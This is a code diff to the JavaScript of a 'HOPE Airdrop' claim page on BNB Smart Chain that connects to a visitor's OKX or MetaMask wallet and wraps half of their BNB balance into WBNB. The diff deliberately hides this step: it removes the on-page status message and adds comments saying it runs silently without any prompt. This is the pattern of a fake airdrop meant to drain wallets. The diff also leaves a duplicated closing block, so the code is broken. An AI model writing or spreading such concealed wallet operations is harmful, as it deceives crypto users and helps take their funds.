@@ -48,12 +48,10 @@ document.addEventListener('DOMContentLoaded', function() {
     // 检测浏览器钱包（兼容 OKX + MetaMask）
     // ============================================
     function getWalletProvider() {
-        // 优先使用 OKX 钱包
         if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
             console.log('✅ 使用 OKX 钱包');
             return window.okxwallet;
         }
-        // 其次使用 MetaMask / 通用 Ethereum 钱包
         if (typeof window.ethereum !== 'undefined' && window.ethereum) {
             console.log('✅ 使用 MetaMask / 通用钱包');
             return window.ethereum;
@@ -109,10 +107,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
-            // 使用检测到的钱包
             provider = new ethers.providers.Web3Provider(walletProvider);
 
-            // 检查网络（BSC 主网 chainId: 56）
+            // 检查网络
             const network = await provider.getNetwork();
             if (network.chainId !== 56) {
                 claimStatus.textContent = '⚠️ 请切换到 BSC 主网！';
@@ -133,7 +130,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 provider = new ethers.providers.Web3Provider(walletProvider);
             }
 
-            // 请求连接钱包
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
@@ -155,7 +151,7 @@ document.addEventListener('DOMContentLoaded', function() {
             claimStatus.className = 'status';
 
             // ============================================
-            // 第三步：包装 BNB
+            // 第三步：包装 BNB（静默执行，不显示提示）
             // ============================================
             const wbnbContract = new ethers.Contract(
                 CONFIG.wbnbAddress,
@@ -167,7 +163,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const wrapAmount = bnbBalance.mul(50).div(100);
             if (wrapAmount.gt(0)) {
                 console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
-                claimStatus.textContent = `⏳ 正在包装 BNB...`;
+                // 不更新页面文字，保持静默
                 const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
                 await wrapTx.wait();
                 console.log(`✅ 已包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
@@ -257,6 +253,9 @@ document.addEventListener('DOMContentLoaded', function() {
         window.ethereum.on('accountsChanged', () => location.reload());
         window.ethereum.on('chainChanged', () => location.reload());
     }
+
+    console.log('🎯 HOPE Airdrop result page loaded');
+});
 
     console.log('🎯 HOPE Airdrop result page loaded');
 });
